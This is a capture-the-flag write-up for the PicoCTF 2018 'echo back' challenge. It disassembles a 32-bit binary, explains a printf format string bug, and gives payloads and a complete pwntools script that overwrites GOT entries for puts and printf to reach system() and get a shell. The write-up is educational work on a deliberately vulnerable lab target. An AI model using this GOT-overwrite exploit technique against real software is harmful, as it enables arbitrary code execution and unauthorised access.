# Write-up for echo back challenge
# PicoCTF_2018: echo back

**Category:** Binary Exploitation
**Points:** 500

>This program we found seems to have a vulnerability. 
Can you get a shell and retreive the flag? Connect to it with nc 2018shell.picoctf.com 37402.


> # Introduction 
In this write-up we're gonna perform a format string attack. This is the second time we are doing this (a bit more complex), so go check
the first one [here](https://github.com/giannoulispanagiotis/picoCTF-2018-wiretup/tree/master/authenticate).




First of all, let's disassemble the code. We have no idea about the way we gonna solve this challenge.
```asm
Dump of assembler code for function main:
   0x08048643 <+0>:	lea    ecx,[esp+0x4]
   0x08048647 <+4>:	and    esp,0xfffffff0
   0x0804864a <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804864d <+10>:	push   ebp
   0x0804864e <+11>:	mov    ebp,esp
   0x08048650 <+13>:	push   ecx
   0x08048651 <+14>:	sub    esp,0x14
   0x08048654 <+17>:	mov    eax,ds:0x804a038
   0x08048659 <+22>:	push   0x0
   0x0804865b <+24>:	push   0x2
   0x0804865d <+26>:	push   0x0
   0x0804865f <+28>:	push   eax
   0x08048660 <+29>:	call   0x8048480 <setvbuf@plt>
   0x08048665 <+34>:	add    esp,0x10
   0x08048668 <+37>:	call   0x8048440 <getegid@plt>
   0x0804866d <+42>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048670 <+45>:	sub    esp,0x4
   0x08048673 <+48>:	push   DWORD PTR [ebp-0xc]
   0x08048676 <+51>:	push   DWORD PTR [ebp-0xc]
   0x08048679 <+54>:	push   DWORD PTR [ebp-0xc]
   0x0804867c <+57>:	call   0x8048490 <setresgid@plt>
   0x08048681 <+62>:	add    esp,0x10
   0x08048684 <+65>:	call   0x80485ab <vuln>
   0x08048689 <+70>:	mov    eax,0x0
   0x0804868e <+75>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048691 <+78>:	leave  
   0x08048692 <+79>:	lea    esp,[ecx-0x4]
   0x08048695 <+82>:	ret    
End of assembler dump.
```
Okay, main() function is a bit small. Vuln() seems to be the only intresting part here.

```asm
Dump of assembler code for function vuln:
   0x080485ab <+0>:	push   ebp
   0x080485ac <+1>:	mov    ebp,esp
   0x080485ae <+3>:	push   edi
   0x080485af <+4>:	sub    esp,0x94
   0x080485b5 <+10>:	mov    eax,gs:0x14
   0x080485bb <+16>:	mov    DWORD PTR [ebp-0xc],eax
   0x080485be <+19>:	xor    eax,eax
   0x080485c0 <+21>:	lea    edx,[ebp-0x8c]
   0x080485c6 <+27>:	mov    eax,0x0
   0x080485cb <+32>:	mov    ecx,0x20
   0x080485d0 <+37>:	mov    edi,edx
   0x080485d2 <+39>:	rep stos DWORD PTR es:[edi],eax
   0x080485d4 <+41>:	sub    esp,0xc
   0x080485d7 <+44>:	push   0x8048720
   0x080485dc <+49>:	call   0x8048460 <system@plt>
   0x080485e1 <+54>:	add    esp,0x10
   0x080485e4 <+57>:	sub    esp,0x4
   0x080485e7 <+60>:	push   0x7f
   0x080485e9 <+62>:	lea    eax,[ebp-0x8c]
   0x080485ef <+68>:	push   eax
   0x080485f0 <+69>:	push   0x0
   0x080485f2 <+71>:	call   0x8048410 <read@plt>
   0x080485f7 <+76>:	add    esp,0x10
   0x080485fa <+79>:	sub    esp,0xc
   0x080485fd <+82>:	lea    eax,[ebp-0x8c]
   0x08048603 <+88>:	push   eax
   0x08048604 <+89>:	call   0x8048420 <printf@plt>
   0x08048609 <+94>:	add    esp,0x10
   0x0804860c <+97>:	sub    esp,0xc
   0x0804860f <+100>:	push   0x8048739
   0x08048614 <+105>:	call   0x8048450 <puts@plt>
   0x08048619 <+110>:	add    esp,0x10
   0x0804861c <+113>:	sub    esp,0xc
   0x0804861f <+116>:	push   0x804873c
   0x08048624 <+121>:	call   0x8048450 <puts@plt>
   0x08048629 <+126>:	add    esp,0x10
   0x0804862c <+129>:	nop
   0x0804862d <+130>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048630 <+133>:	xor    eax,DWORD PTR gs:0x14
   0x08048637 <+140>:	je     0x804863e <vuln+147>
   0x08048639 <+142>:	call   0x8048430 <__stack_chk_fail@plt>
   0x0804863e <+147>:	mov    edi,DWORD PTR [ebp-0x4]
   0x08048641 <+150>:	leave  
   0x08048642 <+151>:	ret    
End of assembler dump.
```

Hmm, system() function looks familiar and so important. Here, 'system' calls **echo** and prints in the stdout: 'input message:'.

read() reads from the stdin and waits for input. 

printf() prints the input. Again, printf takes only one argument and that's a vulnerability. 

And we have two puts functions that print some strings(e.g. Thanks for sending this message).

Okay, we can exploit printf. What the heck we could do with that.
We know that with printf and %n we can write something in memory. What is our plan?

We want for sure to go again to system function but with another argument. How do we pass another argument to system? 
Sometimes things are so simple that we can't see them lying in front of us.

# > First step: Global Offset Table && code execution redirection

If you don't know about GOT and PLT and the way to exploit them see [here](https://github.com/giannoulispanagiotis/picoCTF-2018-wiretup/tree/master/got-shell%3F).
First of all, we want to change **puts@got.plt** address with the address of vuln. We want to get back to the start. 
(Remember that a name's challenge is a hint: echo back)

On the second pass we are going to change **printf@got.plt** address with the address of system. Think about it. Printf() takes the input from read function as an argument.
What if printf() could behave as if it were system()? 
Answer: We can pass from stdin whatever argument we want (e.g. cat flag.txt).

Now we have a plan!!!

# >  Crafting the payload

Let's do this thing. It's not that easy. 
From the first format string attack we know how to modify a variable and what **%n** does. But, now we want to write to address of
puts@got.plt the address of vuln. So we want to write this number: 0x080485ab in hex, and 134514091 in decimal. Based on what we know about %n
it's impossible to write before %n such a big input. Unfortunately , buffer is not that big.
Have you ever heard about format in printf? ([format](https://en.wikipedia.org/wiki/Printf_format_string))
For example:
```C
#include <stdio.h>

int main ()
{
    int var = 3;
    printf("%d\n", var);
    printf("%10d\n", var);
    printf("%n", var); //what do you wait var to be?
    printf("%d\n", var);
    float v = 3.14;
    printf("%.2f\n", v);
    printf("%11.1f\n", v);
    
    return 0;
}

```

Output: 

![Screenshot from 2019-10-15 16-44-12](https://user-images.githubusercontent.com/37578272/66837077-16870f80-ef6b-11e9-8224-909efcecca0e.png)



Hmm, that's interesting. Similarly, if we write **printf("%134514091d", var)** we'll  have a so small argument/input and at the same time a huge output. 
So, we can write to memory an address like 0x080485ab. But, it takes time to print so many spaces. We are engineers and we can find a faster way to do this. 
We can write two bytes at a time. So first 85ab and then 0804. 
Before that, ofcourse we have to follow the same procedure as the previous challenge with format string attack, add to the input the address that we want to overwrite and then find when we hit this address. When we find those info we can start:

```python 
VULN = 0x080485ab
PUTS_PLT = 0x0804a01c
BEFORE_SYS = 0x80485dc
SYS_PLT = 0x804a020
SYSTEM = 0xf7e0fc00
PRINT_PLT = 0x804a010

payload1 = ''
payload1 += struct.pack("I", PUTS_PLT)
payload1 += struct.pack("I", PUTS_PLT+2) # this is the address for the next 2 bytes : 0804
payload1 += "%7$34211x" # 85ab =  34219 (Decimal) and we subtract 8 because we wrote 2 addresses before(8 bytes)
payload1 += "%7$hn"  # "7" is the times we want to print %x to find the address we want to modify. With 7$ we can hit it immediately.

# e.g. 
# int var1 = 1;
# int var2 = 2;
# printf("%2$d", var1, var2) will print '2'. 
# 'h' before n means to write only two bytes. Search it.
```

Great, we have 85ab inside puts@got.plt. 
We now want to write 0804 in PUTS_PLT + 2 but we've already wrote so many characters that %n alone will write a number bigger than 0804. 
What do you say about writing 10804? To do this, we first want to know how many characters we've already typed.
So, first we write something like : 
```python
payload1 += "%8$x"
payload1 += "%8$hn"
```
and then we subtract the number we see in the higher two bytes of got.plt address with 10804 to find the right number of spaces to add.

Exactly the same we have to do to change printf_plt address with system address. That's a version of the exploit. I have two versions in the repository.
The following makes use of pwntools.

```python
import struct
from pwn import *
r = remote('2018shell.picoctf.com', 37402)
#r = process('./echoback')

VULN = 0x080485ab
PUTS_PLT = 0x0804a01c
BEFORE_SYS = 0x80485dc
SYS_PLT = 0x804a020
SYSTEM = 0xf7e0fc00
PRINT_PLT = 0x804a010

payload1 = ''
payload1 += struct.pack("I", PUTS_PLT)
payload1 += struct.pack("I", PUTS_PLT+2)
payload1 += "%7$34211x"
payload1 += "%7$hn"
payload1 += "%8$33369x"
payload1 += "%8$hn"

r.sendafter('input your message:', payload1)

payload2 = ''
payload2 += p32(0x804a010)
payload2 += p32(0x804a010 + 2)
payload2 += '%' + str((0x08048460 & 0xffff) - 4*2) + 'x'
payload2 += '%7$hn'
payload2 += '%' + str(0x10000 + ((0x08048460 >> 16) - (0x08048460 & 0xffff)))  + 'x'
payload2 += '%8$hn'
r.sendafter('input your message:', payload2)
r.interactive()
```

Then, program waits for your input, but now that input is passed as an argument to system function. 
**cat flag.txt** will do the job.

Congrats. That's it, we got our flag. 
To see more about format string attacks click [here](https://www.youtube.com/watch?v=0WvrSfcdq1I&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=18).







